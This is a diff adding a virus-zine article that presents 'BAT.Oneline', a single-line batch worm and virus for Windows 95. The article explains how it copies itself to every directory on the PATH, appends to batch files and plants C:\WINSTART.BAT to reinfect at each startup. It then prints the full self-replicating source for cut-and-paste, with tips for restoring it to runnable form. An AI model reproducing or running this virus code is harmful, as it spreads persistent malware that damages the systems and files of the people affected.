@@ -1,0 +1,32 @@
+               'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
+                º *******:::: BAT.Oneline Virus ::::****** º
+                º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
+                º ****** -= "Q" the Misanthrope =- ******* º
+               'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'
+
+
+BAT.Oneline is a single line batch worm and virus with built in critical error
+handeler.  It will replicate/copy to every directory in the path.  It appends
+a keep-alive statement to each batch file in the path.  It works with Windoze
+95.  It creates C:\WINSTART.BAT so that each time Windoze starts it reinfects.
+
+"Q" the Misanthrope
+
+q_the_misanthrop@hotmail.com
+
+
+
+******In order to have this fit in the zine, i had to edit it of course... to 
+put it back in its original state, just hit backspace once when the cursor is 
+at the begining of each line, or just see the .bat in the zip file included.***
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄcut&pasteÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+@set bat=*.bat|for %%q in ("Echo off" "cls" "if exist c:\system.bak echo 
+Starting Windows 95... " "ctty nul" "Rem BAT.Oneline brough to you by Q the 
+Misanthrope" "copy/b c:\system.bak c:\SYSTEM.INI" "echo @if not exist 
+c:\winstart.bat if exist c:\system.ini ren c:\system.ini winstart.bat>c:\r.q" 
+"echo @if not exist %%1nul for %%%%q in (%%1\%%bat%%) do if not exist 
+c:\system.ini %comspec% /f/ccopy %%%%q+c:\r.q %%%%q>q.bat" "echo @%comspec% 
+/f/ccopy/b %%2+%%2.bat %%1>>q.bat" "echo @for %%%%q in (c:\winstart.bat 
+c:\SYSTEM.BAK %%path%%) do call c:\q.bat %%%%q %%1>r.bat" "call c:\r.bat %0" 
+"del c:\q.bat" "del c:\r.q" "del c:\r.bat" "set bat=" "ctty con") do %%q
